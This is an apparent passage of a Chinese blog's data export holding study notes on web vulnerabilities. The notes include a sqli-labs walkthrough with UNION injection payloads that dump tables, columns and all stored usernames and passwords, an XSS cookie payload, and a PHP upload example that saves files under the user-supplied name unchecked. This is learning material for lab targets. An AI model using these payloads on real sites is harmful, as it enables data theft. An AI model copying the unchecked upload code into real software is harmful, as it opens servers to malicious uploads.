参数的正确写法\n\n该函数的作用是把上传的文件移动到一个新的位置。因为前端文件上传之后是存在一个临时文件中，在脚本结束后，临时文件就会销毁，所以如果想要保存上传的文件，就需要使用move_uploaded_file()函数将文件转移到指定存放位置。\n有两个参数，第一个参数是你上传后的临时文件名，由系统自动生成。通常其名称在\n\n```\n$_FILE[\"file\"][\"tmp_name\"];\n```\n\n其中的file为你前台文件上传表单的名称(\"name\")。\n**第二个参数就是包含有路径的新的文件名**。如：\n\"upload/1.jpg\";\n这样，就会把你上传的文件，移动到当前目录下名称upload的子目录下，并把文件名保存为：1.jpg\n\n### php move_uploaded_file()介绍\n\nmove_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。\n\n**语法**\n\n```php\nmove_uploaded_file(filename,destination)\nmove_uploaded_file($_FILE[\"file\"][\"tmp_name\"],\"upload/\".$_FILE[\"file\"][\"name\"]) \n    //将临时文件拷贝到upload目录下的同名文件中\n```\n\n**参数** \n\n| 参数        | 描述                 |\n| ----------- | -------------------- |\n| filename    | 上传的文件的文件名。 |\n| destination | 移动文件到这个位置。 |\n\n**本函数检查并确保由 filename 指定的文件是合法的上传文件。如果文件合法，则将其移动到 destination指定的位置。**\n\n如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。\n\n如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。\n\n**注意**\n\n1. 本函数仅用于通过 HTTP POST 上传的文件。\n2. 如果目标文件已经存在，将会被覆盖。\n\n### move_uploaded_file()函数实例\n\n使用move_uploaded_file()函数上传文件到服务器。\n\n```php\n<?php\n     $tmp_filename = $_FILES['myupload']['tmp_name'];\n     if(!move_uploaded_file($tmp_filename,\"/path/to/dest/{$_FILES['myupload']['name']}\")) {\n          echo \"An error has occurred moving the uploaded file.<BR>\";\n          echo \"Please ensure that if safe_mode is on that the \" . \"UID PHP is using matches the file.\";\n          exit;\n     } else {\n          echo \"The file has been successfully uploaded!\";\n     }\n?>\n```","slug":"2020-09-29-常见漏洞原理","published":1,"updated":"2021-01-15T14:09:48.576Z","comments":1,"photos":[],"link":"","_id":"ckkntx9ja000axov74qaqo4nv","content":"<p>[toc]</p>\n<h1 id=\"常见web漏洞\"><a href=\"#常见web漏洞\" class=\"headerlink\" title=\"常见web漏洞\"></a>常见web漏洞</h1><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p>\n<p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>\"keyword=关键字\"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt=\"\"></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt=\"\"></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt=\"\"></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt=\"\"></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt=\"\"></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt=\"\"></p>\n<p><img src=\"/img/--%20.png\" alt=\"\"></p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt=\"\"></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt=\"\"></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt=\"\"></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt=\"\"></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt=\"\"></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"img%5Cunion%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt=\"\"></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n<h2 id=\"任意文件包含\"><a href=\"#任意文件包含\" class=\"headerlink\" title=\"任意文件包含\"></a>任意文件包含</h2><p>网站服务器配置中的allow_url_fopen以及allow_url_include对文件包含的实现影响很大</p>\n<p>最常用的方式是在页面可以包含文件的情况下，用file://(本地文件包含) ,php://filter(input, memory,temp) ,data:// ,zip://系列 ,http://(远程文件包含)还有phar:// 等伪协议进行文件包含，进行传马，getshell等操作</p>\n<h2 id=\"XSS跨站请求\"><a href=\"#XSS跨站请求\" class=\"headerlink\" title=\"XSS跨站请求\"></a>XSS跨站请求</h2><h3 id=\"反射型-reflect\"><a href=\"#反射型-reflect\" class=\"headerlink\" title=\"反射型(reflect)\"></a>反射型(reflect)</h3><p>还没彻底整明白，以后再水</p>\n<h3 id=\"储存型-store\"><a href=\"#储存型-store\" class=\"headerlink\" title=\"储存型(store)\"></a>储存型(store)</h3><p>还没彻底整明白，以后再水</p>\n<h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><p>上次招新赛就是DOM型，传入的username参数会被嵌入到返回页面的DOM中，直接嵌入</p>\n<pre class=\"line-numbers language-HTML\"><code class=\"language-HTML\"><script>alert(document.cookie)</script><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>直接弹出cookie</p>\n<h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>重要基础知识</p>\n<pre><code>当客户端提交后，收到上传文件的页面获得了一个$_FILES 数组 \n\n$_FILES数组内容如下: \n$_FILES['myFile']['name'] 客户端文件的原名称。 \n$_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持。 \n$_FILES['myFile']['size'] 已上传文件的大小，单位为字节。 \n$_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 \n$_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) \n\nUPLOAD_ERR_OK \n值：0; 没有错误发生，文件上传成功。 \nUPLOAD_ERR_INI_SIZE \n值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 \nUPLOAD_ERR_FORM_SIZE \n值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 \nUPLOAD_ERR_PARTIAL \n值：3; 文件只有部分被上传。 \nUPLOAD_ERR_NO_FILE \n值：4; 没有文件被上传。 \n值：5; 上传文件大小为0. \n\n文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</code></pre><h3 id=\"PHP-FILES中error返回值详解\"><a href=\"#PHP-FILES中error返回值详解\" class=\"headerlink\" title=\"PHP $_FILES中error返回值详解\"></a>PHP $_FILES中error返回值详解</h3><p>用PHP上传文件时，我们会用程序去监听浏览器发送过来的文件信息，首先会通 过$_FILES[fieldName][‘error’]的不同数值来判断此欲上传的文件状态是否正常。$_FILES[fieldName] [‘error’]==0代表一切正常，其它数值的具体含义请参考下面一段程序的注释部分</p>\n<p>$_FILES[‘file’][‘error’]值 </p>\n<p>UPLOAD_ERR_OK: 0 //正常，上传成功 </p>\n<p>UPLOAD_ERR_INI_SIZE: 1 //上传文件大小超过服务器允许上传的最大值，php.ini中设置upload_max_filesize选项限制的值 </p>\n<p>UPLOAD_ERR_FORM_SIZE: 2 //上传文件大小超过HTML表单中隐藏域MAX_FILE_SIZE选项指定的值 </p>\n<p>UPLOAD_ERR_PARTIAL: 3 //文件只有部分被上传 </p>\n<p>UPLOAD_ERR_NO_FILE: 4 //没有文件被上传</p>\n<p>UPLOAD_ERR_NO_SIZE: 5//上传文件大小为0</p>\n<p>UPLOAD_ERR_NO_TMP_DIR: 6 //没有找不到临时文件夹 </p>\n<p>UPLOAD_ERR_CANT_WRITE: 7 //文件写入失败 </p>\n<p>UPLOAD_ERR_EXTENSION: 8 //php文件上传扩展没有打开 </p>\n<h3 id=\"PHP文件上传-move-uploaded-file-参数的正确写法\"><a href=\"#PHP文件上传-move-uploaded-file-参数的正确写法\" class=\"headerlink\" title=\"PHP文件上传 move_uploaded_file() 参数的正确写法\"></a>PHP文件上传 move_uploaded_file() 参数的正确写法</h3><p>该函数的作用是把上传的文件移动到一个新的位置。因为前端文件上传之后是存在一个临时文件中，在脚本结束后，临时文件就会销毁，所以如果想要保存上传的文件，就需要使用move_uploaded_file()函数将文件转移到指定存放位置。<br>有两个参数，第一个参数是你上传后的临时文件名，由系统自动生成。通常其名称在</p>\n<pre><code>$_FILE[\"file\"][\"tmp_name\"];</code></pre><p>其中的file为你前台文件上传表单的名称(“name”)。<br><strong>第二个参数就是包含有路径的新的文件名</strong>。如：<br>“upload/1.jpg”;<br>这样，就会把你上传的文件，移动到当前目录下名称upload的子目录下，并把文件名保存为：1.jpg</p>\n<h3 id=\"php-move-uploaded-file-介绍\"><a href=\"#php-move-uploaded-file-介绍\" class=\"headerlink\" title=\"php move_uploaded_file()介绍\"></a>php move_uploaded_file()介绍</h3><p>move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。</p>\n<p><strong>语法</strong></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span>destination<span class=\"token punctuation\">)</span>\n<span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILE</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"upload/\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$_FILE</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n    <span class=\"token comment\" spellcheck=\"true\">//将临时文件拷贝到upload目录下的同名文件中</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><strong>参数</strong> </p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>filename</td>\n<td>上传的文件的文件名。</td>\n</tr>\n<tr>\n<td>destination</td>\n<td>移动文件到这个位置。</td>\n</tr>\n</tbody></table>\n<p><strong>本函数检查并确保由 filename 指定的文件是合法的上传文件。如果文件合法，则将其移动到 destination指定的位置。</strong></p>\n<p>如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。</p>\n<p>如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p>\n<p><strong>注意</strong></p>\n<ol>\n<li>本函数仅用于通过 HTTP POST 上传的文件。</li>\n<li>如果目标文件已经存在，将会被覆盖。</li>\n</ol>\n<h3 id=\"move-uploaded-file-函数实例\"><a href=\"#move-uploaded-file-函数实例\" class=\"headerlink\" title=\"move_uploaded_file()函数实例\"></a>move_uploaded_file()函数实例</h3><p>使用move_uploaded_file()函数上传文件到服务器。</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n     <span class=\"token variable\">$tmp_filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'myupload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp_filename</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/path/to/dest/{$_FILES['myupload']['name']}\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token keyword\">echo</span> <span class=\"token string\">\"An error has occurred moving the uploaded file.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Please ensure that if safe_mode is on that the \"</span> <span class=\"token punctuation\">.</span> <span class=\"token string\">\"UID PHP is using matches the file.\"</span><span class=\"token punctuation\">;</span>\n          exit<span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token keyword\">echo</span> <span class=\"token string\">\"The file has been successfully uploaded!\"</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<p>[toc]</p>\n<h1 id=\"常见web漏洞\"><a href=\"#常见web漏洞\" class=\"headerlink\" title=\"常见web漏洞\"></a>常见web漏洞</h1><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p>\n<p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 